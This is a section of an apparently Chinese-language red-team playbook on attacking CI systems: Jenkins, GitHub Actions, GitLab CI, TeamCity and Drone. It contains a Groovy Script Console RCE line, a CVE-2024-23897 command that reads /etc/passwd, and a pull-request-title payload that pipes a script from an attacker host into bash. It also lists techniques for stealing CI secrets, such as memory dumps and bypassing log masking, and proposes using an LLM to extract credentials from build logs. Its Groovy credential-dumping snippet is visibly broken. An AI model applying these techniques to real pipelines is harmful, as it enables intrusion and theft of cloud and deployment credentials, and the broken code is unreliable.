## 三、CI 系统攻击（核心战场）

### 3.1 Jenkins 攻击
```
# 3.1.1 识别与入口
#   /login /script /manage /api/json /oops /env /computer
#   Header: X-Jenkins: <版本>（未认证可读）
# 3.1.2 Script Console RCE（Groovy，需 Overall/Administer）
#   /script 执行:
new ProcessBuilder('cmd','/c','whoami').redirectErrorStream(true).start().text
# 3.1.3 CVE-2024-23897（CLI 任意文件读取→RCE，CVSS 9.8，KEV 在野利用）
#   影响: Jenkins 2.441及更早 / LTS 2.426.2及更早
#   根因: args4j expandAtFiles 功能——参数中 @文件路径 会被替换为文件内容
#   利用1（未认证读前3行）:
#     java -jar jenkins-cli.jar -s http://target -noKeyAuth connect-node "@<file>"
#   利用2（有 Overall/Read 读全文）:
#     connect-node "@/etc/passwd" 等，或用公开 PoC 脚本（CVE-2024-23897.py）
#   读高价值文件: /etc/passwd、用户列表、Remember me 密钥、secrets
#   升级RCE变体: 读密钥伪造 Remember me cookie / Resource Root URL 签名 →
#                进入 Script Console / 存储型 XSS via build logs
# 3.1.4 凭据存储攻击（拿到 Jenkins 后）
#   /script:
def c = Jenkins.instance.getExtensionList(jenkins.security.ApiTokenProperty.class)
// 读取所有凭据:
def k = new hudson.util.Secret()
Jenkins.instance.getExtensionList(jenkins.model.Jenkins.class)
  .each { }
// 凭据插件解密: /script 中反射解密 $JENKINS_HOME/credentials.xml（AES 密钥在
//   secrets/master.key + secrets/hudson.util.Secret）
# 3.1.5 API token / CSRF / remember me cookie 伪造
# 3.1.6 高危插件面（按需核对最新公告）:
#    Script Security 权限检查缺失(CVE-2024-52549,文件存在性探测)
#    Pipeline Groovy 已撤销脚本可重建(CVE-2024-52550)
#    OpenId Connect 会话固定(CVE-2024-52553,社工→管理员)
#    IvyTrigger XXE(CVE-2022-46751)
#    老经典: CVE-2017-1000353(CLI反序列化RCE)、CVE-2018-1000861(Script Security绕过)
# 3.1.7 部署凭据: 从 job 配置/凭据库提取云AK、SSH key、Registry 凭据 → 横向
```

### 3.2 GitHub Actions 攻击
```
# 3.2.1 workflow 注入（不可信输入进命令/表达式）
#   风险输入: PR标题、issue标题/评论、commit message、branch/tag名、
#             PR body、附件文件名
#   危险写法:
steps:
  - run: echo "${{ github.event.pull_request.title }}"   # 注入命令
  - run: git checkout "${{ github.head_ref }}"           # 注入分支名
#   注入payload示例（PR标题）: 
#     `"; curl http://attacker/x.sh | bash #`
#     `${{ runner.os }}` 表达式注入 → 直接执行 `${{ github.event... }}`
# 3.2.2 GITHUB_TOKEN 滥用
#   GITHUB_TOKEN 默认权限含 contents:write → 注入后可篡改仓库/放后门
#   actions:read → 读私有仓库 workflow（拿更多 secret 引用面）
#   pull_request_target 事件: 在 base 分支上下文中跑不可信 PR 代码 → 可直接读 secrets
# 3.2.3 自托管 Runner 攻击
#   自托管 runner = 任意能触发 workflow 的用户可在其上执行代码
#   扫描 runner 注册路径: /actions/runner /actions-runner
#   注入 workflow → RCE 在 runner（常挂高权限挂载/云角色）
#   runner 注册 token 泄露 → 注册恶意 runner 窃取 job
# 3.2.4 secrets 窃取（tj-actions 事件复盘见9.1）
#   secrets 以明文形式存在于 Runner.Worker 进程内存 → 内存dump可提取
#   通过双 base64 编码绕过 GitHub 的 secret masking 输出到日志
# 3.2.5 供应链面: 复用第三方 action（@owner/repo@tag）→ tag 被篡改即全库中毒
#   - 固定到 commit SHA 可缓解；红队侧: 攻陷知名 action 维护者账户即可（见9.1）
# 3.2.6 云身份: OIDC (id-token: write) → AssumeRoleWithWebIdentity
#   拿 OIDC token 即可换取云临时凭据 → 云横向（联动cloud-security-audit技能）
```

### 3.3 GitLab CI 攻击
```
# 3.3.1 .gitlab-ci.yml 注入面
#   - 可控变量(CI_VARIABLES/Branch名)进入 shell → RCE
#   - 使用不可信 image / services（镜像投毒）
#   - after_script/before_script 中引用可控输入
# 3.3.2 CI_JOB_TOKEN（默认权限过大）
#   - CI_JOB_TOKEN 可访问: api/v4/projects（读仓库）、registry（拉推镜像）、
#     packages（读包）、dependency proxy
#   - 窃取后可用于读私有仓库/镜像（供应链上游）
# 3.3.3 Runner 攻击面
#   - 共享 Runner: 任意项目可用 → 投毒（其他项目也共用）
#   - Runner Token 泄露 → 注册恶意 Runner
#   - Runner 执行环境含 DOCKER_AUTH_CONFIG/CI_REGISTRY_PASSWORD 等变量
# 3.3.4 CI/CD variables（项目/组级）: 保护变量=敏感凭据的集中点
#   - 需要 maintainer 权限读取；拿到后即供应链钥匙
# 3.3.5 已知漏洞: CVE-2023-7028（见2.5）、CVE-2023-2825（任意合并→RCE）、
#   CVE-2021-22214（CI lint SSRF）、pipeline schedule 功能滥用
```

### 3.4 其他 CI 系统
```
# TeamCity: 未认证 RCE(CVE-2023-42793, CVSS 9.8, 广泛在野利用)
#   /app/rest/debug/processes 等端点；自带 API token 端点滥用
# Drone: 共享 secret 滥用（DRONE_SECRET 可被任意构建读取）
#   DRONE_RPC_SECRET 泄露 → 伪造构建/下发任务
# CircleCI/Travis: 环境变量泄露面、第三方服务集成(OAuth)滥用
# 通用手法: 平台默认口令、API 未认证端点枚举、构建日志搜索、SSO 绕过
```

### 3.5 CI 凭据与变量窃取（黄金战利品）
```
# 窃取优先级:
# 1) 云凭据: AWS_ACCESS_KEY/AZURE_CLIENT_SECRET/阿里云AK → 云横向
# 2) 部署凭据: K8s kubeconfig/helm registry/SSH deploy key
# 3) 数据库/中间件凭据（构建测试环境常用生产配置）
# 4) 三方 API key（Slack/支付/邮件）
# 窃取途径:
# - CI 变量面板（需权限）
# - 构建日志（错误回显/调试输出/secret 未掩码）
# - 凭据文件（.env/.npmrc/.pypirc/settings.xml）
# - 环境变量 dump（runner 上 env）
# - 构建缓存/工作区文件
# - 内存 dump（GitHub Actions Runner.Worker，见3.2.4）
# AI辅助: 批量把构建日志/环境变量给LLM做凭据提取与归类（见11.1）
```

### 3.6 流水线注入（可控输入→RCE 全场景）
```
# 注入面矩阵: 能进"命令拼接/表达式求值"的任何不可信输入
#   GitHub: PR标题/body/issue/commit/branch/tag/附件名
#   GitLab: 提交信息/分支名/tag名/CI变量/merge request标题
#   Jenkins: 参数化构建的字符串参数/SCM变更记录/upstream触发数据
#   Webhook: 伪造的 push/PR 事件 payload
# 通用检测: 在流水线配置中寻找
#   1) echo ${{...}} / echo $VAR            → 无引号拼接
#   2) git checkout ${BRANCH}                → 命令注入
#   3) curl $URL / $(curl ...)               → 外带
#   4) docker run --rm $IMAGE                → 镜像注入
#   5) python -c "...$INPUT..."              → 解释器注入
# 利用流程: 构造恶意输入 → 触发构建 → 观察 RCE 回显/外带
```

